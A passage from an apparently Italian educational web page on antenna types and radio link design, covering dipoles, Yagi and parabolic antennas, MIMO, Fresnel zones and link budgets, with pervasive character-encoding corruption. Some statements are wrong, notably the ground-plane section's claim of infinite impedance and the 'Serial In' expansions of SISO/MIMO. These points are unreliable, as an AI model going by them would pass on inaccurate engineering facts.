paritÃ  di condizioni.\nTuttavia, la relazione tra la dimensione e l\u0026rsquo;area equivalente dell\u0026rsquo;antenna non Ã¨ lineare. CiÃ² significa che raddoppiare la dimensione dell\u0026rsquo;antenna non raddoppia necessariamente la sua area equivalente. La relazione dipende dalle specifiche caratteristiche dell\u0026rsquo;antenna, come la sua geometria, la frequenza di lavoro e le proprietÃ  del materiale di cui Ã¨ fatta. Pertanto, la scelta delle dimensioni dell\u0026rsquo;antenna dipende dalle specifiche esigenze di trasmissione e ricezione del sistema di telecomunicazioni in cui viene utilizzata, e deve essere fatta in base a una progettazione attenta e un\u0026rsquo;analisi dettagliata delle caratteristiche dell\u0026rsquo;antenna.\nNel caso del dipolo l\u0026rsquo;area equivalente Ã¨ legata alla lunghezza d\u0026rsquo;onda, nel caso della parabola Ã¨ legata al diametro dell\u0026rsquo;antenna.\n Fattore di trasduzione da densitÃ¡ di potenza incidente Il fattore di trasduzione da densitÃ  di potenza incidente, noto anche come fattore di conversione, Ã¨ un parametro che indica la capacitÃ  di un\u0026rsquo;antenna ricevente di convertire la densitÃ  di potenza del campo elettromagnetico incidente in una tensione elettrica rilevabile ai suoi terminali di uscita.\nIn altre parole, il fattore di trasduzione da densitÃ  di potenza incidente rappresenta il rapporto tra la potenza elettrica generata ai terminali di uscita dell\u0026rsquo;antenna e la densitÃ  di potenza del campo elettromagnetico incidente sull\u0026rsquo;antenna stessa, espressa in watt per metro quadrato.\nIl fattore di trasduzione dipende dalle caratteristiche geometriche e di orientamento dell\u0026rsquo;antenna ricevente, dalla frequenza del segnale incidente, dalla polarizzazione del segnale elettromagnetico e dalle proprietÃ  del mezzo di propagazione.\nIl fattore di trasduzione Ã¨ un parametro importante per la valutazione delle prestazioni delle antenne riceventi, in quanto consente di stimare l\u0026rsquo;efficienza con cui l\u0026rsquo;antenna converte l\u0026rsquo;energia elettromagnetica incidente in una tensione di uscita utile per l\u0026rsquo;elaborazione del segnale ricevuto.\n Antenne omnidirezionali Sono omnidirezionali quelle antenne che irradiano in modo uniforme in un piano, che di solito Ã© il piano \\(H\\) (orizzontale), in cui il diagramma di radiazione Ã© un cerchio.\nIn altri piani, come per esempio nel piano \\(E\\) sono direttive.\nLe antenne omnidirezionali sono utilizzate quando il sistema di trasmissione si trova in posizione baricentrica rispetto allâ€™area da servire, per cui nel piano \\(H\\), si ha lo stesso campo indipendentemente dalla posizione dellâ€™antenna ricevente. Ã‰ questo, il caso della trasmissone in brodcast (da un trasmettitore verso tutti i ricevitori che si trovano entro lâ€™area di copertura) di trasmettitori radio AM/FM e TV.\nIn questo caso lâ€™antenna fondamentale Ã© il tipolo in \\( \\lambda/2\\). Ã‰ poi possibile intervenire sulla lunghezza o sulla sezione dellâ€™antenna per modificare il diagramma di radiazione nel piano verticale, in modo da ottenere le caratteristiche desiderate in termini di lunghezza dellâ€™antenna e quindi di praticitÃ¡ nellâ€™installazione.\n Dipolo in Î»/2 E unâ€™antenna a dipolo la cui lunghezza fisica ( \\(l\\) ) Ã© pari a \\( \\lambda/2\\), dove \\( \\lambda\\) Ã© la lunghezza dâ€™onda del segnale (portante) impresso sullâ€™antenna. Per questo motivio viene chiamato dipolo in \\( \\lambda/2\\) o dipolo a mezzâ€™onda (half wave dipolo). La lunghezza fisica di un dipolo in \\( \\lambda/2\\) si calcola come:\n$$ \\Large\\textsf{}l_{fisica} = \\dfrac{\\lambda}{2} = \\dfrac{1}{2} \\frac{F_v * c}{f} \\space [m] $$\nDove:\n \\(c \\approx3 * 10^8 \\space m/s\\): velocitÃ¡ di propagazione nel vuoto; \\(F_v\\): fattore di velocitÃ¡, tipicamente compreso fra \\(0,92\\) e \\(0,98\\); \\(f\\): frequenza (portante) del segnale che deve essere irradiato;  Anche per le antenne si definisce, infatti, un fattore di velocitÃ¡ (\\(F_v\\)), quanto la velocitÃ¡ di propagazione nel conduttore Ã© minore di quella nel vuoto. Le principali caratteristiche di un dipolo \\( \\lambda/2\\) sono le seguenti:\n Il guadagno Ã© pari a \\(G = 2,15\\) dBi; Nel piano \\(H\\) il diagramma di radiazione Ã© un cerchio e quindi lâ€™antenna Ã© omnidirezionale; nel piano \\(H\\) lâ€™intensitÃ¡ del campo elettrico si puÃ³ determinare, ricordando la formula:  $$ \\Large\\textsf{}E = \\dfrac{60 * I}{r} \\space [V/m] $$\nDove:\n \\(I\\) (A): corrente nel punto di alimentazione; \\(r\\) (m): distanza dallâ€™antenna;  Le altre caratteristiche:\n nel piano \\(E\\) lâ€™antenna Ã© direttiva, con un angolo di apertura pari a \\( \\theta = 78 \\degree\\); Nello spazio libero la resistenza di radiazione teorica Ã© pari a \\(R_r = 73 \\spaceÎ©\\); la resistenza dâ€™antenna effettiva, varia al variare del rapporto \\( \\lambda/d\\) dove \\(d\\) Ã© il diametro del conduttore, spesso, si inserisce un opportuno adattatore quando si collega lâ€™antenna a un cavo coassiale con impedenza caratteristica \\(Z_0 = 50 \\space Î©\\);  Quando la frequenza dei segnali da trasmettere Ã© relativamente bassa la lunghezza fisica di un dipolo \\( \\lambda/2\\) diventa rilevante. Sono state cosÃ­ realizzate antenne che consentono di avere lunghezze inferiori, come le seguenti: antenna Marconi o antenna in \\( \\lambda/4\\), Ground Plane, antenne caricate.\n Antenna Marconi Lâ€™antenna Marconi (o antenna a \\( \\lambda/4\\) ) Ã© unâ€™antenna che dimezza la lunghezza dellâ€™elemento radiante rispetto al dipolo \\( \\lambda/2\\), essa Ã© montata verticalmente e connessa a terra attraverso il generatore che lo alimenta; questa antenna sfrutta la terra come superficie conduttrice riflettente.\nIl suo funzionamento si basa sul principio delle immagini il quale afferma che il campo prodotto da una carica posta nelle vicinanze di un piano conduttore equivale al campo nel caso in cui vi fosse una carica di segno opposto, simmetrica rispetto al piano e detta carica immagine.\nÃ‰ possibile sostituire un semidipolo con un piano conduttore, che puÃ³ anche essere il terreno. Supponendo la terra sia un perfetto conduttore, essa produce lo stesso effetto di un semidipolo immagine, e quindi nella porzione di spazio che contiene lâ€™antenna reale si ottiene un diagramma di radiazione analogo a quello di un dipolo \\( \\lambda/2\\).\nLe caratteristiche fondamentali di unâ€™antenna \\( \\lambda/4\\) sono:\n  Lâ€™antenna Ã© omnidirezionale nel piano \\(H\\), in cui il diagramma di radiazione Ã© un cerchio;\n  Il diagramma di radiazione nel piano \\(E\\) Ã© pari alla metÃ¡ superiore di quello del dipolo \\( \\lambda/2\\);\n  Il guadagno aumenta di \\(3 dB\\) e diventa pari a:\n$$ \\Large\\textsf{}G = 3 dBd \\implies G = 5,15 dBi $$\n  La resistenza di radiazione si dimezza e per unâ€™antenna filiforme diventa pari a \\(R_r = 36,5 Î©\\), in quanto lâ€™antenna Ã© costituita da un semidipolo.\n  Lâ€™antenna Marconi trova impiego prevalentemente nelle trasmissioni a frequenza relativamente bassa, in onde lunghe (LF) e onde medie (MF). Per ottenere un piano conduttore di caratteristiche migliori rispetto alla terra si stende sotto lâ€™antenna, una maglia di fili di rame intrecciati, nota come contrappeso (counterpoise).\n Antenna Ground Plane Un\u0026rsquo;antenna Ground Plane Ã¨ un tipo di antenna a dipolo in cui la radiazione avviene grazie all\u0026rsquo;assenza di una sezione del dipolo, sostituita da un piano di massa o \u0026ldquo;ground plane\u0026rdquo;. Questo piano di massa, a forma di piatto o di disco, si trova sotto l\u0026rsquo;antenna e serve come elemento di ritorno per il segnale radio.\nIn un\u0026rsquo;antenna Ground Plane ideale, il piano di massa avrebbe un\u0026rsquo;impedenza infinita e sarebbe perfettamente orizzontale rispetto all\u0026rsquo;antenna, formando un angolo di 90 gradi rispetto alla direzione di emissione del segnale. In realtÃ , tuttavia, il piano di massa ha una resistenza finita e non Ã¨ mai completamente orizzontale, il che puÃ² influire sulle prestazioni dell\u0026rsquo;antenna.\nPer quanto riguarda i valori resistivi, la resistenza del piano di massa dipende dal materiale utilizzato, dalle dimensioni e dalla forma. Solitamente si cerca di utilizzare materiali con alta conduttivitÃ , come il rame o l\u0026rsquo;alluminio, per minimizzare la resistenza. Tuttavia, la resistenza del piano di massa puÃ² comunque variare a seconda delle condizioni ambientali, come la presenza di umiditÃ  o di contaminanti.\nL\u0026rsquo;angolo formato dal piano di massa dipende dalla geometria dell\u0026rsquo;antenna e dalle esigenze di progetto. In generale, l\u0026rsquo;angolo deve essere tale da massimizzare il guadagno dell\u0026rsquo;antenna nella direzione di emissione del segnale e minimizzare il guadagno nelle direzioni indesiderate. Solitamente, l\u0026rsquo;angolo varia tra i 30 e i 60 gradi rispetto all\u0026rsquo;orizzontale.\n Antenne Caricate Le antenne caricate sono antenne che utilizzano un\u0026rsquo;induttanza o un condensatore per modificare le loro proprietÃ  elettriche, in modo da adattarsi meglio alle specifiche esigenze di progetto. La carica, che Ã¨ una reattanza, puÃ² essere utilizzata per vari scopi, come la riduzione delle dimensioni dell\u0026rsquo;antenna, la regolazione dell\u0026rsquo;impedenza di ingresso o la focalizzazione della radiazione in determinate direzioni.\nAd esempio, un\u0026rsquo;antenna a filo rettilineo lunga a Î»/4 puÃ² essere carica in modo da apparire come un\u0026rsquo;antenna piÃ¹ corta, ma con le stesse proprietÃ  elettriche. CiÃ² consente di ottenere una riduzione delle dimensioni fisiche dell\u0026rsquo;antenna, senza comprometterne le prestazioni.\nInoltre, le antenne caricate possono essere utilizzate per adattare l\u0026rsquo;impedenza di ingresso dell\u0026rsquo;antenna alla sorgente del segnale. Questo puÃ² essere utile, ad esempio, quando l\u0026rsquo;antenna Ã¨ collegata a un amplificatore o a un ricevitore con un\u0026rsquo;impedenza diversa da quella dell\u0026rsquo;antenna. In questo caso, l\u0026rsquo;antenna viene carica in modo da presentare un\u0026rsquo;impedenza di ingresso compatibile con quella della sorgente del segnale.\nInfine, le antenne caricate possono essere utilizzate per focalizzare la radiazione in determinate direzioni. CiÃ² puÃ² essere ottenuto utilizzando carichi di induttanza o di capacitÃ  in modo selettivo, in modo da modificare la distribuzione della corrente lungo l\u0026rsquo;antenna e quindi la direzione di emissione del segnale.\nIn sintesi, le antenne caricate sono un\u0026rsquo;importante tecnologia che consente di adattare le proprietÃ  elettriche delle antenne alle specifiche esigenze di progetto, per ottenere prestazioni ottimali in diverseÂ applicazioni.\n Dipolo ripiegato (folded dipole) e antenne a banda larga Unâ€™altra variante del dipolo \\( \\lambda/2\\) Ã© costituita dal dipolo ripiegato (folded dipole). Questâ€™antenna realizzata congiungendo gli estremi di un dipolo \\( \\lambda/2\\) con un conduttore parallelo a esso per simulare un dipolo \\( \\lambda/2\\) avente un diametro del conduttore piÃº grande.\nPoichÃ© la banda di un dipolo aumenta con lâ€™aumentare del diametro del conduttore, il dipolo ripiegato Ã© unâ€™antenna a banda larga utilizzata come elemento base delle antenne riceventi TV.\nIl guadagno rimane lo stesso del dipolo \\( \\lambda/2\\), la resistenza di radiazione quadruplica arricando a circa \\(R_r = 300 Î©\\). Questa antenna puÃ³ essere usata da sola oppure puÃ³ costituire lâ€™elemento radiante di antenne piÃº complesse, come le antenne riceventi TV di tipo Yagi.\n Antenne direttive Unâ€™antenna che concentra la maggior parte della potenza irradiata lungo una direttrice ben precisa, viene definita direttiva unidrezionale, o piÃº semplicemente direttiva.\nLe antenne direttive hanno le seguenti caratteristiche salienti:\n Guadagno piÃº alto; Non irradiano nelle aree che non interessa servire; Lâ€™antenna Ã© adatta per collegamenti di tipo punto-punto;  Un parametro importante per le antenne direttive Ã© lâ€™FBR (Front-to-Back Ratio), che ne definisce il grado di unidirezionalitÃ¡. PiÃº alto Ã© lâ€™FBR e maggiore sarÃ¡ lâ€™unidirezionalitÃ¡ dellâ€™antenna.\nDiagramma di radiazione di unâ€™antenna direttiva undirezionale Yagi:\n Angolo di apertura del fascio (beamwidth) o angolo di radiazione Viene definito angolo di apertura a 3 dB (beamwidth), o angolo di radiazione di unâ€™antenna (\\( \\theta\\) ), lâ€™angolo indiviato dai due punto sul diagramma di radiazione in cui il grafico diminuisce di 3 dB rispetto al valore che si ha nella direzione di massimo irraggiamento.\nNelle due direzioni individuate dallâ€™angolo \\( \\theta\\) la densitÃ¡ di potenza, \\(S\\), si dimezza, rispetto al valore nella direzione di massimo irraggiamento, e di conseguenza il campo elettrico, \\(E\\), diviene pari a \\(E = E_{max \\space IRR} / \\sqrt{2}\\).\n Front-to-Back Ratio (rapporto avanti/dietro) Il Front-to-Back Ratio (FBR), o rapporto avanti/dietro, esprime il grado di unidrezionalitÃ¡ di unâ€™antenna direttiva.\nLâ€™FBR Ã© espresso in decibel ed Ã© pari alla differenza tra il guadagno (normalizzato) nella direzione di massima irradiazione (\\( 0\\degree\\)) e il guadagno (normalizzato) che si ha nella direzione opposta (a \\(180\\degree\\)gradi):\n$$ \\Large\\textsf{}FBR = G (0\\degree) - G (180\\degree) $$\n Antenna Yagi Unâ€™antenna direttiva puÃ³ essere realizzata affiancando a un dipolo \\( \\lambda/2\\) degli elementi passivi. Un elemento passivo Ã© un conduttore, avente lunghezza appropriata, che viene posta nelle immediate vicinanze dellâ€™elemento radiante. Lâ€™elemento passivo intercetta una parte dellâ€™energia irradiata e a sua volta la reirradia.\nLâ€™antenna Yagi Ã© composta da:\n Un elemento attivo costituito da un dipolo \\( \\lambda/2\\) Un elemento passivo detto riflettore, avenete lunghezza maggiore di \\( \\lambda/2\\) che riflette le onde elettromagnetiche nella direzione desiderata; Uno o piÃº elementi passivi, detti direttori, che hanno lunghezza minore di \\( \\lambda/2\\) i quali concentrano la potenza irradiata nella direzione desiderata.  Facendo unâ€™analogia ottica, il riflettore si comporta come uno specchio, mentre i direttori si comportano come delle lenti convergenti.\nLâ€™antenna Yagi Ã© molto utilizzata come antenna ricevenete TV. Il riflettore tubolare puÃ³ essere sostituito da un riflettore formato da un diedro di materiale condutttore, sulla cui bisettrice viene posto il dipolo attivo. Si realizza cosÃ­ lâ€™antenna a diedro o corner riflector.\n Antenna collineari e a cortina Un modo per aumentare la direttivitiÃ¡ e il guadagno di unâ€™antenna Ã© quello di utilizzare sistemi radianti costituiti da un certo numero ($N$) di dipoli \\( \\lambda/2\\) allineati e alimentati. Se i dipoli sono disposti sullo stesso asse si ottiene unâ€™antenna collineare o allineamento (array) collineare, mentre se i dipoli sono disposti a matrice su un piano si ottiene una cortina di dipoli.\nIn tal modo il guadagno rispetto al dipolo \\( \\lambda/2\\), espresso in dBd, diventa pari a \\(G = 10\\log_{10}N d Bd\\).\n Puntamento delle antenne direttive Nel caso di collegamenti che impiegano antenne direttive, Ã© importante conoscere il diagramma di radiazione per poter puntare correttamente lâ€™antenna, cioÃ© per posizionarla nella direzione in cui lâ€™antenna capta meglio. Un errato puntamento dellâ€™antenna causa una diminuzione del segnale fornito in uscita dallâ€™antenna stessa, che puÃ³ anche annullarsi.\n Antenne a superficie Quando si opera nel campo delle microonde (UHF, SHF, EHF) le onde radio possono essere considerate come dei raggi che Ã© possibile riflettere e focalizzare tramite superfici di forma e materiale opprtuni.\n Antenna parabolica Nel campo dellâ€™illuminazione per ottenere uno stretto fascio luminoso Ã© possibile utilizzare riflettori parabolici, ponendo una sorgente luminosa nel punto focale di una superficie riflettente a forma di paraboloide.\nSe lâ€™irradiazione di una sorgente, posta nel punto focale, viene riflessa da una superficie costituita da un paraboloide, la potenza irradiata viene concentrata in un fascio molto stretto lungo la direzione di propagazione, ottenendo cosÃ­ un elevato guadagno.\nI diagrammi di radiazione nei piani \\(H\\) ed \\(E\\) mostrano un lobo principale molto pronunciato, con un angolo di apertura molto piccolo, che denota un elevato guadagno.\nPer il principio di reciprocitÃ¡ lâ€™antenna conserva le sue proprietÃ¡ anche quando viene usata come antenna ricevente. Il guadagno delle antenne paraboliche arriva a valori molto alti, anche 60 dB per antenne di grandi dimensioni.\nLâ€™illuminazione della superficie parabolica, cioÃ© lâ€™irradiazione delle onde elettromagnetiche verso la superficie riflettente, puÃ³ essere realizzata in vari modi:\n Unâ€™antenna vera e propria posta nel fuoco della parabola; Una guida dâ€™onda tronca o terminata a tromba posta nel fuoco della parabola;  Lâ€™illuminazione non Ã© uniforme, ma decresce verso i bordi, lâ€™illuminatore tende a illuminare meglio il centro. Per questo motivo si definisce lâ€™efficienza, \\( \\eta\\), di unâ€™antenna parabolica come il rapporto tra lâ€™area equivalente ( \\(A_{eq}\\) ), o area efficace e lâ€™area geometrica ( \\(A_g\\) ) dellâ€™antenna in esame: \\( \\eta = A_{eq} / A_g\\). Normalmente si ha \\(0,5 \u0026lt; \\eta \u0026lt; 0,8\\); in mancanza di dati certi si puÃ³ assumere il valore tipico \\( \\eta = 0,65\\).\nIl guadagno di una antenna parabolica dipende dalla sua efficienza, dal suo diametro ( \\(D_a\\) ) e dalla lughezza dâ€™onda del segnale captato o irradiato secondo la seguente relazione:\n$$ \\Large\\textsf{}G = 10 \\log_{10} \\eta \\begin{pmatrix} \\dfrac{\\pi * D_a}{\\lambda} \\end{pmatrix}^2 ; [dB] $$\nLâ€™angolo di apertura a 3 dB (beamwidth) di unâ€™antenna parabolica si puÃ³ calcolare come:\n$$ \\Large\\textsf{}\\theta\\degree \\approx 70 \\dfrac{\\lambda_{[m]}}{D_{a[m]}} $$\n Parabola offset Le parabole che hanno lâ€™illuminatore nel fuoco vengono denominate prime focus. Per limitare le interferenze sono state realizzate parabole denominate offset le quali sono costituite da una sezione di un paraboloide che punta verso un illuminatore posto nel fuoco, il quale perÃ² non Ã¨ al centro dellâ€™antenna bensÃ¬ in posizione sottostante.\n Antenne paraboliche per la ricezione TV da satellite Lâ€™antenna parabolica costituisce unâ€™antenna direttiva ad alto guadagno utilizzata anche per la ricezione di segnali TV da satellite (sistema DVB-S, Digital Video Broadcasting-Satellite).\nIn questo caso sia perchÃ© lâ€™intensitÃ  del segnale ricevuto Ã¨ estremamente debole, sia perchÃ© la frequenza del segnale ricevuto Ã¨ molto elevata, viene montato direttamente sulla parabola un dispositivo denominato LNB (Low Noise Black converter), collegato allâ€™antenna ricevente vera e propria e a un polarizzatore, per discriminare il segnale in base alla sua polarizzazione.\nLâ€™LNB Ã¨ composto fondamentalmente da tre parti:\n LNA (Low Noise Amplifer): Ã¨ un amplificatore che eleva il livello del segnale RF ricevuto; Mixer o down converter: ha il compito di abbassare la frequenza del segnale captato portandola dalla radio frequenza a una frequenza detta frequenza intermedia (FI); Filtro passa banda e amplificatore a FI: per eliminare le frequenze indesiderate e amplificare il segnale a FI prima di inviarlo sul cavo coassiale;   Parabola Cassegrain Ãˆ un tipo di antenna parabolica, che ha un diverso sistema di illuminazione, lâ€™illuminatore, costituito da una guida dâ€™onda tronca (feed horn), Ã¨ posto al centro della parabola e punta su una superficie riflettente secondaria, denominata subriflettore, avente la forma di un iperboloide di rotazione, in questo modo si ottiene unâ€™illuminazione piÃ¹ uniforme.\n Sistemi di antenna MIMO(Multiple In Multiple Out) In alta frequenza, i sistemi dâ€™antenna possono impiegare una o piÃº antenne e possono essere suddivisi nei seguenti sistemi:\n SISO (Serial In Serial Out): sono i sistemi che utilizzano unâ€™antenna lato trasmissione e unâ€™antenna lato ricezione; sono sistemi adatti a operare quando lâ€™ambiente Ã© assimilabile allo spazio libero. SIMO (Serial In Multiple Out): sono i sistemi che operano lato ricezione con due antenne riceventi, per implementare la tecnica della diversitÃ¡ di spazio; sono adatti a operare quando il ricevitore Ã© posto in un ambiente in cui vi sono oggetti che causano riflessioni. MISO (Multiple In Serial Out): sono unâ€™alternativa ai sistemi SIMO, in cui si utilizzano due antenne trasmittenti e unâ€™antenna ricevente. MIMO (Multiple In Multiple Out): sono i sistemi piÃº moderni che utilizzano contemporaneamente due o piÃº antenne in trasmissione e due o piÃº antenne in ricezione. Sono sistemi che trasmettono e ripartiscono il flusso di bit in ingresso su piÃº segnali modulati inviati in parallelo alle antenne trasmittenti; i segnali vengono captati dalle antenne riceventi e con sofisticate tecniche di elaborazione digitale dei segnali (DSP) sono demodulati e viene riassemblato il flusso id bit originario; i sistemi MIMO consentono di aumentare la capacitÃ¡ trasmissiva di un sistema allâ€™aumentaredel minimo tra (m, n), dove m Ã© il numero di antenne usate in trasmissione e n Ã© il numero di antenne usate in ricezione; possono operare in maniera piÃº efficace in ambienti in cui vi sono molte riflessioni in quanto sono in grado di compensare le differenze di fase fra i vari percorsi e quindi di sfruttare positivamente i segnali riflessi. I sistemi MIMO sono impiegati nei sistemi di comunicazione radio piÃº moderni; apparati WiFi (802.11n), sistemi di accesso wireless a banda larga (WiMAX), sistemi per la comunicazione in mobilitÃ¡ di ultima generazione (LTE, Long Term Evolution).   Installazione dei sistemi di antenna Quando si opera a frequena elevate (bande VHF/UHF/SHF) le onde elettromagnetiche si propagano per onda diretta, propagazione detta anche in visibilitÃ¡ ottica (Line Of Sight - LoS).\nQuesto tipo di propagazione richiede che le antenne tramittenti e riceventi siano (quasi) visibili lâ€™una allâ€™altra, in quanto le onde elettromagnetiche viaggiano direttamente dallâ€™antenna trasmittente allâ€™antenna ricevente.\nNello spazio libero i percorsi seguiti sarebbero rettilinei, mentre nellâ€™atmosfera essi risentono delle disomogeneitÃ¡ del mezzo.\nIn condizioni normali (atmosfera standard) le disomogeneitÃ¡ causano delle rifrazioni facendo sÃ­ che il percorso seguito da unâ€™onda elettromagnetica sia allâ€™incirca un arco di cerchio.\nIn situazioni anomale si possono avere rifrazioni diverse, fenomi di riflessione, diffrazioni e assorbimento, che causano ulteriori perdite. Tali fenomeni avvegono nella troposfera in quanto la stratosfera e la ionosfera a queste frequenze si possono considerare sostanzialmente simili allo spazio libero.\nI calcoli relativi allâ€™installazione e al posizionamento delle antenne sono semplificati se si considerano i percorsi come rettilinei. a tale scopo si tiene conto del fatto che in realtÃ¡ i percorsi sono archi di cerchio, introducendo cosÃ­ il concetto di terra equivalente.\nLa terra equivalente Ã© una superficie terrestre fittizzia in cui si possono considerare i percorsi delle onde elettromagnetiche come rettilinei.\nIl raggio della terra equivalente si ottiene moltiplicando il raggio effettivo della terra per un fattore $k$ (effective earth radius factor), che per lâ€™atmosfera standard vale \\(k = 4/3 \\approx 1,33\\), per cui si ha \\(R_{eq} = k * R_0 = 4/3 * 6367 \\approx 8490\\) km.\n Orizzonte radio e massima distanza fra due antenne Lâ€™orizzonte radio di unâ€™antenna trasmittente, posta a unâ€™altezza \\(h_{TX}\\) (m) dal suolo, Ã© la massima distanza, \\(d_{TX}\\) (in km) a cui lâ€™altezza Ã© in visibilitÃ¡ radio con unâ€™antenna posta a livello del suolo.\nIn un ambiente privo di ostacoli lâ€™orizzonte radio risulta pari a:\n$$ \\Large\\textsf{}d_{TX} \\approx 4,12 \\sqrt{h_{TX [m]}} ; [km] $$\nLâ€™orizzonte radio Ã© piÃº grande dellâ€™orizzonte visivo in quanto le onde elettromagnetiche compiono dei percorsi che sono archi di cerchio.\nIn un ambiente privo di ostacoli la massima distanza \\(d_{max}\\) Ã© pari alla somma degli orizzonti radio e si puÃ³ calcolare come:\n$$ \\Large\\textsf{}d_{max} = d_{TX} + d_{RX} \\approx 4,12 (\\sqrt{h_{TX_[m]}} + \\sqrt{h_{RX_[m]}}) ; [km] $$\nQuando le condizioni dellâ€™atmosfera non sono quelle standard varia la curvatura della traiettoria del raggio. Si definiscono cosi le seguenti due condizioni:\n subrifrazione, quando \\(k \u0026lt; 4/3\\) e la curvatura Ã© inferiore rispetto alla condizione standard; lâ€™onda elettromagnetica (raggio) devia verso lâ€™alto rispetto alla traiettoria standard; superrifrazione, quando \\(k \u0026gt; 4/3 \\); la curvatura Ã© maggiore di quella standard; lâ€™onda elettromagnetica (raggio) devia verso il basso rispetto alla traiettoria standard.  Queste situazioni possono comportare una diminuzione anche forte della potenza di segnale che giunge allâ€™antenna ricevente e si configurano come una forma di fading.\n Perdite per diffrazione e prima zona di Fresnel Quando in un collegamento radio il terreno (o un ostacolo di dimensione \u0026raquo; \\( \\lambda\\) ) risulta vicino alla linea fittizzia che congiunge lâ€™antenna trasmittente con quella ricevente intervengono fenomeni di diffrazione che riducono la potenza del segnale ricevuto.\nLa maggior parte della potenza giunge allâ€™antenna ricevente viaggia in una zona dello spazio denominata prima zona di Fresnel, individuata da un eliissoide di ratoazione detto ellisoide di Fresnel.\nIl raggio massimo dellâ€™ellissoide di Fresnel si ha quando \\(d_1 = d_2 = d/2\\), il raggio massimo dellâ€™ellissoide di Fresnel risulta pari a:\n$$ \\Large\\textsf{}r_{max} = 8,66 \\sqrt{\\dfrac{d_{km}}{f_{GHz}}} ; [m] $$\nLe perdite per diffrazione sono trascurabili solo se la prima zona di Fresnel risulta libera da ostacoli. Quindi lâ€™altezza delle torri o dei tralicci viene calcolata imponendo che eventuali ostacoli risultino posti a distanze maggiori di \\(r_{max}\\).\n Dimensionamento di un collegamento radio Ãˆ necessario fare il bilancio di potenza di un collegamento, o link (power) budget, per calcolare qual Ã¨ il livello di potenza che si fornisce in ingresso al primo amplificatore in ricezione.\n Bilancio di potenza (link budget) di un collegamento radio Il bilancio di potenza di un collegamento radio Ã¨ una relazione matematica che lega il livello di potenza con cui opera il trasmettitore al livello di potenza che si ha in ingresso al ricevitore, sommando tutti i guadagni e sottraendo tutte le attenuazioni che sono presenti fra uscita del trasmettitore e ingresso del ricevitore:\n$$ \\Large\\textsf{}L_{PRX} = L_{PTX[dBm \\ (o \\ dBW)]} + \\sum Guadagni_{[dB]} - \\sum Attenuazioni_{[dB]} ; dBm\\ (o \\ DBW) $$\nSpesso si preferisce spezzare il bilancio di potenza in due parti:\n Calcolo dellâ€™EIRP del sistema tramittente, sottraendo al livello di potenza del trasmettitore ( \\(L_{PTX}\\) ) lâ€™attenuazione del feeder (cavo) \\(A_F\\) in dB, e sommando il guadagno dellâ€™antenna trasmittente ( \\(G_T\\) in dBi); Si calcola il livello in ricezione sottraendo allâ€™EIRP lâ€™attenuazione del collegamento radio, tenendo conto dellâ€™attenuazione dello spazio libero ( \\(A_{sl}\\) ) dellâ€™eventuale attenuazione supplementare (\\( A_{suppl}\\) ), sommando il guadagno dellâ€™antenna ricevente e sottranendo lâ€™attenuazione dellâ€™eventuale feeder (cavo), \\(A_F\\).  $$ \\begin{cases} EIRP = L_{PTX[dBm \\ (o \\ dBW)]} - A_{F[dB]} + G_{T[dB]} \\ dBm \\ (o \\ dBW) \\newline L_{PRX} = EIRP - [A_{sl} + A_{suppl} + M_L] + G_R - A_F ; dBm \\ (o \\ dBW) \\end{cases} $$\n Calcolo del livello in ricezione Per calcolare il livello in ricezione si procede nel seguente modo:\n  Determiniamo lâ€™EIRP del sistema trasmittente.\n  Calcoliamo il livello di potenza del trasmettitore esprimendo la potenza in \\( mW \\) e applicando la relazione:\n$$ \\Large\\textsf{}L_{PTX} = 10\\log_{10} \\ P_{TX[mW]} [dBm] $$\n  Calcoliamo lâ€™attenuazione del cavo coassiale (feeder), lâ€™attenuazione per unitÃ  di lunghezza (\\( \\alpha \\)) e la sua lunghezza ( \\(l\\) ) come:\n$$ \\Large\\textsf{}A_F = \\alpha * l [dB] $$\n  Noto il tipo di antenna e le sue caratteristiche si determina il guadagno ( \\(G_T\\), in \\(dBi\\), o semplicemente in $dB$ per le antenne paraboliche).\n  Si calcola lâ€™EIRP:\n$$ \\Large\\textsf{}EIRP = L_{PTX [dBm]} - A_{F[dB]} + G_{T[dB]} [dBm] $$\n    Determiniamo lâ€™attenuazione del collegamento radio.\n  Calcoliamo lâ€™attenuazione dello spazio libero ( \\(A_{sl}\\) ) e la distanza fra le antenne \\((r)\\) in km:\n$$ \\Large\\textsf{}A_{sl} = 32,5 + 20\\log_{10} f_{MHz} + 20\\log_{10} ; r_{km} [dB] $$\nSe si opera a frequenze elevate, si dovrebbe verificare che lâ€™altezza sia sufficiente per fornire la visibilitÃ¡ radio fra le antenne.\n  Stimiamo lâ€™attenuazione supplementare ( \\(A_{suppl}\\) ); indicativamente in ambiente aperto e in situazioni meteo favorevoli lâ€™attenuazione supplementare Ã© trascurabile per frequenze inferiori ai \\(10 GHz\\), \\(0,02 dB/km\\) a circa \\(0,2 dB/km\\) fino a \\(40 GHz\\).\n  Si introduce un margine del collegamento, o margine di link (\\(M_L\\)) per tener conto dellâ€™aumento di attenuazione che si potrebbe avere in determinate condizioni atmosferiche. \\(M_L\\) Ã© legato alla frequenza di trasmissione e alla disponibilitÃ¡ che si desidera ottenere per il collegamento.\nNei collegamenti terrestri si puÃ³ aggiungere nel margine di link anche un margine contro i fading (margine di fading, \\(M_F\\)).\n    Determiniamo il livello di potenza in ingresso al ricevitore.\n  Noto il tipo di antenna ricevente e le sue caratteristiche se ne determinina il guadagno (\\(G_g\\), in dBi, o dB per le antenne paraboliche).\n  Si calcola lâ€™attenuazione del feeder in ricezione.\n  Si calcola il livello di potenza in ingresso al ricevitore:\n$$ \\Large\\textsf{}L_{PRX} = EIRP - [A_{SL} + A_{suppl} + M_L] + G_R - A_{FRX} dBm $$\n    Si verifica che il livello in ricezione sia almeno pari alla sensibilitÃ¡ del ricevitore affinchÃ© il sistema fornisca in uscita un segnale con livello e qualitÃ¡ accettabile:\n$$ \\Large\\textsf{}L_{PRX_[dBm] } \\geq S_{RX_[dBm]} $$\n  Utilizzando la stessa metedologia Ã© possibile, variando i dati, determinare unâ€™incognita diversa:\n Distanza massima del collegamento Guadagno che deve avere lâ€™antenna ricevente Margine di link che si ha   Fading delle Antenne Il fenomeno del fading delle antenne si riferisce alla perdita di intensitÃ  del segnale radio quando viene trasmesso da un\u0026rsquo;antenna e ricevuto da un\u0026rsquo;altra. Questo puÃ² accadere a causa di diverse ragioni, tra cui l\u0026rsquo;effetto della riflessione, la diffrazione e l\u0026rsquo;assorbimento delle onde radio.\nIn particolare, il fading puÃ² essere causato dalla riflessione delle onde radio su superfici come edifici, alberi o montagne, che possono creare zone di attenuazione o interferenza nel segnale radio. Inoltre, il fading puÃ² essere causato dalla diffrazione, 